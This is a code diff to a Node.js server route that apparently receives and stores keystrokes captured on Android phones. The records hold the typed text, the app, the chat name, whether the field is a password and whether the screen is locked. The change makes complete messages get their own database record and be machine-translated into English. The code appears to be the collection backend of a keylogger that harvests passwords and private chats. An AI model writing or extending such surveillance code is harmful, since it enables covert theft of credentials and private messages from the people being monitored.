@@ -36,11 +36,12 @@ router.post('/', authenticateApiKey, async (req, res) => {
 
         if (inputType === 'complete_message') {
             console.log('📤 Complete message received, saving directly to DB');
+            // For complete messages, always create new record (don't merge)
             const textInputData = await saveTextInputToDB({
                 id, timestamp, packageName, appName, deviceId,
                 keyboardInput, inputField, inputType, screenTitle, fieldHint, chatName,
                 isPassword, isScreenLocked, activityName, viewId, deviceModel, androidVersion
-            });
+            }, true); // Pass true to skip merging for complete messages
 
             return res.status(201).json({ success: true, message: 'Complete message saved successfully', data: textInputData });
         } else {
@@ -65,7 +66,7 @@ router.post('/', authenticateApiKey, async (req, res) => {
 });
 
 // Helper function to save text input to database
-async function saveTextInputToDB(data) {
+async function saveTextInputToDB(data, skipMerge = false) {
     const sanitizeValue = (value) => {
         if (value === null || value === undefined) return null;
         if (typeof value === 'object') {
@@ -95,6 +96,30 @@ async function saveTextInputToDB(data) {
     };
 
     console.log('🧾 Prepared incoming text-input document:', JSON.stringify(incoming, null, 2));
+
+    // Skip merging if this is a complete message - always create new record
+    if (skipMerge || incoming.inputType === 'complete_message') {
+        console.log('📝 Creating new record (skipMerge=true or complete_message)');
+        // Always create new record for complete messages
+        const result = await TextInput.create(incoming);
+        console.log('✅ New text input record created:', result.id);
+        
+        // Translate if needed
+        try {
+            const translationResult = await translationService.translateText(result.keyboardInput || '');
+            if (translationResult.success && !translationResult.isEnglish) {
+                result.keyboardInputEN = translationResult.translation;
+                await result.save();
+            } else if (translationResult.success && translationResult.isEnglish) {
+                result.keyboardInputEN = result.keyboardInput || '';
+                await result.save();
+            }
+        } catch (translationError) {
+            console.error('❌ Failed to translate text input:', translationError.message);
+        }
+        
+        return summarizeResult(result);
+    }
 
     // 0) First 15 chars same rule: merge within same device/package/view
     try {
